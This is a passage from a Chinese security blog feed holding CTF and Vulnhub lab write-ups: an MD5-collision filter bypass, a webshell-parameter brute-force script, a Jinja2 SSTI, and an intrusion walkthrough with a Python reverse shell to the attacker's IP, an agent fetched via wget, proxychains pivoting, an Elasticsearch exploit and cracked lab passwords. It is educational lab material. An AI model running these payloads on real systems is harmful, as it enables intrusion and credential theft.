class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>echo `$cmd`; 这句话会将 cmd 变量作为系统命令执行并输出，像是echo system($cmd)</p>
</blockquote>
<p>这个代码可以分为两个部分，第一部分关于img参数，主要作用就是读取文件内容；第二部分就是cmd参数，主要作用就是命令执行。由于img过滤了flag，所以读取flag的内容应该通过命令执行获得。即重要的是第二部分。</p>
<p>第二部分有一个难题，那就是如何绕过如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure></p>
<p>如果只有后者，可以通过传入数组绕过，但是前面的却无法这样绕过。因此只能使用md5碰撞来绕过，也就是两个字符串不一样，但是它们md5值一样，从网上找到了两组： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></p>
<p>这里比较难以理解的是为什么反斜杠可以绕过：<code>l\s</code> 可以执行。</p>
<blockquote>
<p>php解释器会将<code>//</code>解释为一个反斜杠；正则解释器也是一个道理。如果要用php正则匹配一个反斜杠，需要写4个反斜杠，因为四个反斜杠经过php解释器会变成两个反斜杠，两个反斜杠经过正则解释器会变成一个反斜杠，所以能够匹配。但是反常的是有时候三个反斜杠才能正则匹配一个反斜杠（本题就是），所以本题可以使用反斜杠绕过。</p>
</blockquote>
<p>但是也可以用其他办法，比如<code>ls</code>用<code>dir</code>代替，<code>cat</code> 用<code>sort</code>代替。因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. dir+/</span><br><span class="line">2. sort+/flag</span><br></pre></td></tr></table></figure></p>
<p>用burp提交！+也可以用%20代替。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401223906.png" /></p>
<h1 id="总结">总结</h1>
<p>本题的难点主要在于MD5碰撞和最后的过滤绕过。尤其是反斜杠绕过，是在不能理解。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php伪协议</tag>
        <tag>命令执行</tag>
        <tag>MD5碰撞绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯 2019 高明的黑客</title>
    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
<h1 id="解题">解题</h1>
<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
<p>最终结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_shrine</title>
    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
<span id="more"></span>
<h1 id="题目信息">1 题目信息</h1>
<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
<ul>
<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
<li>第二可以访问/shrine/xxx；</li>
<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
</ul>
<p>查看是否存在SSTI：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
<h1 id="解题">2 解题</h1>
<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>直接得到flag：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>Jinjia2</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>第1周：Vulnhub Socialnetwork writeup</title>
    <url>/2022/03/27/%E7%AC%AC1%E5%91%A8%EF%BC%9AVulnhub%20Socialnetwork%20writeup/</url>
    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第一周，该靶机难度中等。将内网渗透过程中的主要知识点都涉及了，质量非常高。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</p>
<p>难度：Medium</p>
<p>虚拟机软件：Virtual Box</p>
<h1 id="虚拟机配置">虚拟机配置</h1>
<h2 id="virtual-box-下载安装">Virtual Box 下载、安装</h2>
<p>首先，去virtual box <a href="https://www.virtualbox.org/wiki/Downloads">官网</a>下载，要下载两个东西： 1. 安装包 2. 扩展包</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143744.png" /></p>
<p>记住，安装包和扩展包的版本得一致，否则扩展包无法安装。</p>
<p>下载完毕之后，先安装Virtual Box，安装完毕之后选择 <code>管理-&gt;全局设定-&gt;扩展</code> 然后选择刚刚下载好的扩展包即可。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143913.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143956.png" /></p>
<h2 id="网络配置">网络配置</h2>
<ol type="1">
<li>打开主机的 <code>网络适配器选项</code> 找到主机连接网络的网卡，然后共享到 <code>VirtualBox Host-Only Ethernet Adapter</code>。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144304.png" /></p>
<p>设置共享的时候会跳出一个对话框，里面有IP地址，要记住它。</p>
<ol start="2" type="1">
<li>回到 virtual box，<code>管理-&gt;主机网络管理器</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144440.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144448.png" /></p>
<p>第一张图中的IPv4地址修改成刚刚弹出的IP地址，其他也需要对应的修改为同一网段。</p>
<ol start="3" type="1">
<li>将kali和靶机都设置为如下</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144559.png" /></p>
<p>到这一步，打开kali会发现其实无法上网，那是因为此时没有路由，输入命令 <code>route -n</code> 结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144727.png" /></p>
<p>（我涂掉的那一行应该是没有的，我后天添加上去的）</p>
<ol start="4" type="1">
<li>添加路由</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo route add default gw 192.168.137.1 （刚刚记住的IP）</span><br></pre></td></tr></table></figure>
<p>然后再次查看路由，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144914.png" /></p>
<p>此时 <code>ping baidu.com</code> 发现有数据包，成功连接外网。（每次开机都需要添加一次路由，需要永久的可以百度）</p>
<p>到此为止，配置结束。</p>
<h1 id="渗透">渗透</h1>
<p>打开kali和靶机，开始渗透。kali 的IP 为 <code>192.168.137.101</code>。</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">或者 sudo nmap 192.168.137.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145228.png" /></p>
<p>第一个是网关，第二个是主机在该网段的IP，所以第三个就是靶机的IP地址。</p>
<p>靶机IP Get！</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.102</span><br></pre></td></tr></table></figure>
<p>在渗透的过程中最好全端口扫描，不要有遗漏！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145500.png" /></p>
<p>开放端口为 22， 5000。</p>
<p>端口信息 Get！</p>
<h2 id="端口服务发现">端口服务发现</h2>
<p>知道开放端口后，扫面一下对应端口的服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 192.168.137.102</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145655.png" /></p>
<p>发现 5000 端口上的服务是 http，可能存在网页。版本信息为 <code>Werkzeug httpd 0.14.1</code> ， 用的是 python2，说明靶机存在着python环境。版本为 <code>2.7.15</code>。</p>
<p>（百度一下 Werkzeug，Werkzeug 是一个WSGI工具包，也可以作为一个Web框架的底层库。）</p>
<h2 id="访问http服务">访问http服务</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327150053.png" /></p>
<p>经过测试，只有这一个功能点，作用是将输入的内容显示出来。</p>
<p><strong>web应用程序最重要的一步就是目录扫描！</strong></p>
<h2 id="目录扫描">目录扫描</h2>
<p>推荐使用 <code>dirsearch</code>，（如果没有的话可以按照提示安装）命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dirsearch -u http://192.168.137.102:5000/</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154504.png" /></p>
<p>注意到有一个结果，访问看看</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154534.png" /></p>
<h2 id="反弹shell">反弹shell</h2>
<p>根据这个页面的提示，这里好像可以执行代码，之前的信息里说明这个环境使用python搭建的，因此尝试以下python的代码执行，可以百度一下python反弹shell的代码（修改一下kali的IP和监听端口）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.137.101&quot;</span>,<span class="number">8888</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>然后在kali上监听对应的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155030.png" /></p>
<p>（注意，要先监听，然后再执行 python 反弹 shell 的代码，大致上可以理解 kali 开启一个服务然后让靶机来链接，如果 kali 没开就连不上）</p>
<p>成功反弹shell，运气很好，是 root。查看一下文件，发现有一个 <code>dockerfile</code> 文件。熟悉docker的应该感觉不对劲，<strong>可能这是一个docker容器，并不是真实的主机！</strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155120.png" /></p>
<p>查看 <code>Dockerfile</code> ，发现是docker模板文件：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155427.png" /></p>
<p>进一步怀疑当前是一个docker系统。接下来用两个方法进一步确定：</p>
<ol type="1">
<li><code>ls /.dockerenv</code>，根目录存在该文件，大概率为docker系统； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155548.png" /></li>
<li><code>cat /proc/1/cgroup</code>，Linux初始化进程（进程id为1）的cgroup中包含着docker镜像信息的时候，可以确定是docker； <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155620.png" /></li>
</ol>
<p>查看以下IP地址，发现IP地址和kali扫描出来的不一样</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327160430.png" /></p>
<p>docker系统的这个网段可以当作是目标主机的内网网段，接下来就需要做到：</p>
<ol type="1">
<li>内网是否存在其他主机</li>
<li>哪台主机是真实的目标</li>
<li>是否存在漏洞可以利用</li>
</ol>
<h2 id="内网主机发现">内网主机发现</h2>
<p>可以通过 <code>ping</code> 只要修改最后面的数值即可，但是这里子网有16位，也就是有65535个IP地址需要测试。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 255);do ping -c 1 172.17.0.$i; done</span><br><span class="line"></span><br><span class="line">for i in $(seq 0 255);do for j in $(seq 1 255);do ping -c 1 172.17.$i.$j;done;done</span><br><span class="line">解释：双层循环，-c后面的 1 表示一个地址只发一个数据包</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327185626.png" /></p>
<p>发现内网内只有3个IP地址存活（这个脚本运行的比较慢，也可以用工具）。</p>
<p>当前IP地址是 172.17.0.2，那么接下来就需要对另外两个主机进行扫描，因为kali的工具无法直接应用在内网环境下，所以需要利用代理，将172.17.0.2作为代理对内网主机进行扫描。</p>
<h2 id="内网穿透">内网穿透</h2>
<p>内网穿透工具：<a href="https://github.com/Dliv3/Venom">venom</a></p>
<p>kali 另开一个cmd监听 9999 端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191518.png" /></p>
<p>kali 开启 http 服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8295</span><br><span class="line"></span><br><span class="line">注意：要在venom所在目录运行，换句话说，要在agent.exe在的</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191624.png" /></p>
<p>靶机从kali下载代理端，并运行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.137.101:8295/agent_linux_x64 根据靶机的操作系统选择对应的代理端</span><br><span class="line">如果提示没有文件，查看以下kali开启的http服务是否在venom目录下</span><br><span class="line"></span><br><span class="line">chmod +x agent_linux_x64</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.137.101 -rport 9999</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327192942.png" /></p>
<p>启动 socks5 代理： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. show</span><br><span class="line">2. goto 1</span><br><span class="line">3. socks 1080 端口可以选其他的</span><br></pre></td></tr></table></figure> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327193102.png" /></p>
<p>接下来修改配置文件 <code>proxychains4.conf</code>，这样就可以让工具通过代理进行工作了，命令前要加上 <code>proxychains</code>。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">将原来的 socks4 127.0.0.1 9050 注释</span><br><span class="line">添加：</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p>
<h2 id="内网信息收集">内网信息收集</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. proxychains4 nmap -Pn -sT 172.17.0.1</span><br><span class="line">2. proxychains4 nmap -Pn -sT 172.17.0.3</span><br></pre></td></tr></table></figure>
<p>结果分别为：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194514.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194527.png" /></p>
<p>可以看到 172.17.0.1 的端口和服务与之前扫描 192.168.137.102 的时候一模一样，所以推测，这就是真正的主机。</p>
<p>可以做一下验证，利用浏览器去访问 <code>172.17.0.1:5000</code> ，如果出现对应的页面，即可确定这就是真正的主机。</p>
<p>不过浏览器也要设置代理，（其实也可以用 <code>proxychains4 firefox</code> 来打开浏览器，但是我这里不知道为什么实现不了）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195300.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195311.png" /></p>
<p>到此，可以完全确定 <code>172.17.0.1</code> 就是真正的主机！还有 <code>172.17.0.2</code> 也需要扫描（这里是因为我们之前拿到的是webshell，扫描看一下有没有漏洞能拿到shell权限）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195702.png" /></p>
<p>发现 9200 端口打开。查看一下对应的服务： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195826.png" /></p>
<p><code>Elasticsearch</code> 版本为 1.4.2。可以用msf查看一下是否存在漏洞。</p>
<h2 id="漏洞利用">漏洞利用</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327200545.png" /></p>
<p>可以一个一个尝试，先尝试第一个。将exp复制到当前目录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201304.png" /></p>
<p>可以用 <code>cat 36337.py</code> 查看一下exp说明，发现是 python2 编写的。</p>
<p>执行exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201554.png" /></p>
<p>又得到一个root权限，但是我们知道，这并不是真正的目标主机，因此进行信息收集。先查看目录，发现有一个 passwords 的文件。查看其中的内容：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201855.png" /></p>
<p>密码一般都是md5加密的，故尝试将所有密码用md5解密，推荐网址：<a href="https://www.somd5.com/">MD5解密</a>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john:1337hack</span><br><span class="line">test:1234test</span><br><span class="line">admin:1111pass</span><br><span class="line">root:1234pass</span><br><span class="line">jane:1234jane</span><br></pre></td></tr></table></figure></p>
<p>想去目标主机开了 22 端口，服务为 ssh，因此尝试使用者这些账号和密码连接： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh [-p 22] john@192.168.100.102 不指定端口的话，默认就是22</span><br></pre></td></tr></table></figure></p>
<p>经尝试，发现只有 john 能够成功登录。接下来就是提权了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327202920.png" /></p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
